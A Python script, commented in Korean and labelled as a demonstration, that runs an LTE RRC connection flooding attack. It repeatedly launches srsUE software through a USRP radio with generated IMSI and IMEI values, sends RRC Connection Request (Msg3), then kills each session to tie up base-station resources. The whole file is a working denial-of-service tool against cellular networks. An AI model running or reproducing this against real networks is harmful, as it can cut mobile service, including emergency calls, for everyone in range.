#!/usr/bin/env python

import subprocess
import time
import os
import sys
import logging
from typing import Optional, Tuple

logger = logging.getLogger(__name__)


def generate_imsi_imei(unique_id: int, mcc: Optional[int] = None, mnc: Optional[int] = None) -> Tuple[str, str]:
    """
    unique_id로부터 IMSI와 IMEI를 생성합니다.
    """
    # IMSI 생성
    if mcc is not None and mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"{mcc:03d}{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    elif mcc is not None:
        imsi = f"{mcc:03d}01{unique_id:010d}"
    elif mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"001{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    else:
        imsi = f"00101{unique_id:010d}"
    
    # IMEI 포맷팅 (15자리)
    imei_suffix = f"{unique_id:06d}"
    imei = f"35349006{imei_suffix}0"
    
    return imsi, imei


def run_srsue_with_config(srsue_path: str, config_path: str, log_file: str, usrp_args: Optional[str] = None,
                          imsi: Optional[str] = None, imei: Optional[str] = None,
                          usim_opc: Optional[str] = None, usim_k: Optional[str] = None,
                          earfcn: Optional[int] = None) -> subprocess.Popen:
    """
    일반 srsue 실행 (attack_mode 없음)
    """
    if not srsue_path:
        raise ValueError("srsue_path는 필수입니다.")
    
    if not os.path.isabs(srsue_path):
        srsue_path = os.path.abspath(srsue_path)
    
    if not os.path.exists(srsue_path):
        raise FileNotFoundError(f"srsue 바이너리를 찾을 수 없습니다: {srsue_path}")
    
    if not os.path.isabs(config_path):
        config_path = os.path.abspath(config_path)
    
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config 파일을 찾을 수 없습니다: {config_path}")
    
    cmd = [
        srsue_path,
        config_path,
        "--log.filename", log_file,
        "--log.all_level", "info",
        "--log.rrc_level", "debug",  # Msg3 로그 확인
        "--log.phy_level", "info",
        "--log.mac_level", "info",
        # attack_mode 옵션 제거 (일반 srsue 사용)
    ]
    
    if usrp_args:
        cmd.extend(["--rf.device_args", usrp_args])
    
    if imsi:
        cmd.extend(["--usim.imsi", imsi])
    
    if imei:
        cmd.extend(["--usim.imei", imei])
    
    if usim_opc:
        cmd.extend(["--usim.opc", usim_opc])
    
    if usim_k:
        cmd.extend(["--usim.k", usim_k])
    
    if earfcn:
        cmd.extend(["--rat.eutra.dl_earfcn", str(earfcn)])
    
    kwargs = {
        'stdout': subprocess.PIPE,
        'stderr': subprocess.PIPE,
    }
    if hasattr(os, 'setsid'):
        kwargs['preexec_fn'] = os.setsid
    elif sys.platform == 'darwin':
        kwargs['start_new_session'] = False
    
    return subprocess.Popen(cmd, **kwargs)


def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, running_flag=None,
                        mcc: Optional[int] = None, mnc: Optional[int] = None, 
                        earfcn: Optional[int] = None, usim_opc: Optional[str] = None,
                        usim_k: Optional[str] = None, srsue_path: Optional[str] = None):
    """
    일반 srsUE를 사용한 Flooding 공격 (시연용)
    - Msg3까지 전송
    - Msg4/Msg5는 수신되지만 무시 (프로세스 종료)
    """
    if not os.path.exists(template_config):
        logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
        return
    
    logger.info(f"템플릿 config: {template_config}")
    logger.info("공격 모드: 일반 srsUE 사용 (Msg3 전송 후 종료)")
    
    ue_id = 1
    current_process = None
    process_start_time = None
    current_log_file = None
    msg3_count = 0
    
    try:
        while running_flag is None or running_flag():
            # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
            if current_process is None or current_process.poll() is not None:
                # 이전 프로세스 정리
                if current_process and current_process.poll() is None:
                    current_process.kill()
                
                # IMSI/IMEI 생성
                imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
                current_log_file = f"/tmp/srsue_normal_{ue_id}_{int(time.time() * 1000)}.log"
                
                try:
                    current_process = run_srsue_with_config(
                        srsue_path, template_config, current_log_file, usrp_args,
                        imsi=imsi, imei=imei,
                        usim_opc=usim_opc, usim_k=usim_k,
                        earfcn=earfcn
                    )
                    process_start_time = time.time()
                    
                    if ue_id == 1:
                        logger.info("첫 번째 UE 실행 (일반 srsUE):")
                        logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
                        logger.info(f"  로그 파일: {current_log_file}")
                        logger.info(f"  프로세스 PID: {current_process.pid}")
                    
                    ue_id += 1
                except Exception as e:
                    logger.error(f"UE {ue_id} 실행 오류: {e}")
                    ue_id += 1
                    continue
            
            # 프로세스 상태 확인
            if current_process:
                poll_result = current_process.poll()
                if poll_result is not None:
                    # 프로세스 종료됨
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    logger.info(f"UE {ue_id-1} 종료 (종료 코드: {poll_result})")
                    current_process = None
                    process_start_time = None
                    current_log_file = None
                    continue
                
                # 로그 파일 확인
                if current_log_file and os.path.exists(current_log_file):
                    try:
                        # 마지막 100줄만 읽기
                        with open(current_log_file, 'rb') as f:
                            try:
                                f.seek(-5000, 2)
                            except OSError:
                                f.seek(0)
                            lines = f.read().decode('utf-8', errors='ignore').split('\n')
                            log_content = '\n'.join(lines[-100:])
                        
                        elapsed = time.time() - process_start_time if process_start_time else 0
                        
                        # RRC Connection Request (Msg3) 전송 확인
                        rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                            'rrc connection request',
                            'sending rrc connection request',
                            'rrc connection request sent',
                            'rrcconnectionrequest',
                            'msg3',
                            'rrc connection request transmitted'
                        ])
                        
                        # RAR 수신 확인
                        rar_received = any(keyword in log_content.lower() for keyword in [
                            'rar received',
                            'random access response',
                            'rar',
                            'msg2'
                        ])
                        
                        # RRC Connection Setup (Msg4) 수신 확인
                        msg4_received = any(keyword in log_content.lower() for keyword in [
                            'rrc connection setup',
                            'rrc_conn_setup',
                            'msg4',
                            'connection setup received'
                        ])
                        
                        # Msg3 전송 확인
                        if rrc_request_sent:
                            msg3_count += 1
                            logger.info(f"✓ Msg3 전송됨 (총 {msg3_count}회) - 프로세스 종료")
                            # Msg3 전송 후 프로세스 종료 (Msg4/Msg5 무시)
                            if current_process.poll() is None:
                                current_process.kill()
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            time.sleep(0.1)  # 다음 UE 시작 전 짧은 대기
                            continue
                        
                        # RAR 수신했는데 Msg3가 안 오는 경우
                        elif rar_received:
                            if elapsed < 3.0:
                                continue  # Msg3 대기
                            else:
                                # 타임아웃 - 프로세스 종료
                                logger.info(f"UE {ue_id-1} 타임아웃 (RAR 수신했지만 Msg3 없음)")
                                if current_process.poll() is None:
                                    current_process.kill()
                                current_process = None
                                process_start_time = None
                                current_log_file = None
                                continue
                        
                        # Msg4 수신 확인 (무시)
                        elif msg4_received:
                            logger.info(f"UE {ue_id-1}: Msg4 수신됨 (무시하고 종료)")
                            if current_process.poll() is None:
                                current_process.kill()
                            current_process = None
                            process_start_time = None
                            current_log_file = None
                            continue
                        
                    except Exception as e:
                        logger.debug(f"로그 파일 읽기 오류: {e}")
                
                # 타임아웃 체크 (최대 10초)
                elapsed = time.time() - process_start_time if process_start_time else 0
                if elapsed > 10.0:
                    logger.info(f"UE {ue_id-1} 타임아웃 (10초 초과)")
                    if current_process.poll() is None:
                        current_process.kill()
                    current_process = None
                    process_start_time = None
                    current_log_file = None
                    continue
            
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        logger.info("\n종료 신호 수신...")
    finally:
        if current_process and current_process.poll() is None:
            current_process.kill()
        logger.info("Flooding 공격 종료")

